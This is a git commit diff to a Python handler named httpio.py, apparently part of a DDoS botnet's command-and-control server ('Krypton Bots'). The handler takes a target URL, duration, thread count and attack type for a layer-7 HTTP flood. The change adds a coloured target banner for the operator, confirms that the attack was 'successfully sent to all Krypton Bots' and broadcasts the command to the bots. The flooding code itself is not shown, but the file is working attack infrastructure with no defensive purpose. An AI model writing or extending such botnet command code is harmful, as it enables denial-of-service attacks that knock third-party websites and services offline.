46806b24cfbc8a9476935354ef53a910bf7effb0
cirqueira <118860604+CirqueiraDev@users.noreply.github.com>
2024-01-22 16:12:57 -0300

    Update httpio.py

--- src/Commands/Methods_L7/httpio.py
+++ src/Commands/Methods_L7/httpio.py
@@ -10,11 +10,20 @@ def httpio(args, validate_time, send, client, ansi_clear, broadcast, data):
         secs = args[2]
         threadx = int(args[3])
         attackType = args[4]
+
+        xxxx = '''%s============= (%sTARGET%s) ==============
+            %s URL:%s %s
+            %sTIME:%s %s
+            %sTYPE:%s %s
+         %sTHREADS:%s %s
+          %sMETHOD:%s %s'''%(Fore.LIGHTBLACK_EX, Fore.GREEN, Fore.LIGHTBLACK_EX, Fore.CYAN, Fore.LIGHTWHITE_EX, url, Fore.CYAN, Fore.LIGHTWHITE_EX, secs, Fore.CYAN, Fore.LIGHTWHITE_EX, attackType, Fore.CYAN, Fore.LIGHTWHITE_EX, threadx, Fore.CYAN, Fore.LIGHTWHITE_EX, 'HTTP IO')
+
         if validate_time(secs):
             if threadx <= maxThreads and threadx > 0:
                 if attackType == 'PROXY' or attackType == 'NORMAL' or attackType == 'proxy' or attackType == 'normal':
-                    time.sleep(1)
-                    send(client, f"{Fore.LIGHTWHITE_EX}\nAttack successfully sent to all {Fore.LIGHTBLACK_EX}Krypton {Fore.LIGHTWHITE_EX}Bots!\n")
+                    for x in xxxx.split('\n'):
+                        send(client, '\x1b[3;31;40m'+ x)
+                    send(client, f" {Fore.LIGHTBLACK_EX}\nAttack {Fore.LIGHTGREEN_EX}successfully{Fore.LIGHTBLACK_EX} sent to all Krypton Bots!\n")
                     broadcast(data)
                 else:
                     send(client, Fore.RED + '\nInvalid attack type (PROXY, NORMAL)\n')
